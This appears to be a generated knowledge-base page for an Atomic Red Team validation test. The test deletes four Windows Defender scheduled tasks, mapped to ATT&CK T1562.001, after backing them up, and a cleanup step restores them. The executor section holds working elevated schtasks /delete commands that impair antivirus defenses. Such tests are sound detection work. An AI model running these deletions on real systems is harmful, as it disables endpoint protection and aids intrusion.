---
atomic_guid: "4b841aa1-0d05-4b32-bbe7-7564346e7c76"
title: "Delete Windows Defender Scheduled Tasks"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.001"
attack_technique_name: "Impair Defenses: Disable or Modify Tools"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
build_date: "2026-04-26 17:02:13"
executor: "command_prompt"
aliases:
  - "4b841aa1-0d05-4b32-bbe7-7564346e7c76"
  - "Delete Windows Defender Scheduled Tasks"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Delete Windows Defender Scheduled Tasks

The following atomic test will delete the Windows Defender scheduled tasks.

[Reference](https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/)

## Metadata

- Atomic GUID: 4b841aa1-0d05-4b32-bbe7-7564346e7c76
- Technique: T1562.001: Impair Defenses: Disable or Modify Tools
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1562.001/T1562.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.001]]

## Dependencies

The Windows Defender scheduled tasks must be backed up first

### Prerequisite Check

```untitled
IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" ( EXIT 0 ) ELSE ( EXIT 1 )
```

### Get Prerequisite

```untitled
schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" > "%temp%\Windows_Defender_Scheduled_Scan.xml"
schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" > "%temp%\Windows_Defender_Cleanup.xml"
schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" > "%temp%\Windows_Defender_Verification.xml"
schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" > "%temp%\Windows_Defender_Cache_Maintenance.xml"
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f )
IF EXIST "%temp%\Windows_Defender_Cleanup.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f )
IF EXIST "%temp%\Windows_Defender_Verification.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f )
IF EXIST "%temp%\Windows_Defender_Cache_Maintenance.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f )
```

### Cleanup

```cmd
schtasks /create /xml "%temp%\Windows_Defender_Scheduled_Scan.xml" /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f
schtasks /create /xml "%temp%\Windows_Defender_Cleanup.xml" /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f
schtasks /create /xml "%temp%\Windows_Defender_Verification.xml" /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f
schtasks /create /xml "%temp%\Windows_Defender_Cache_Maintenance.xml" /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml)
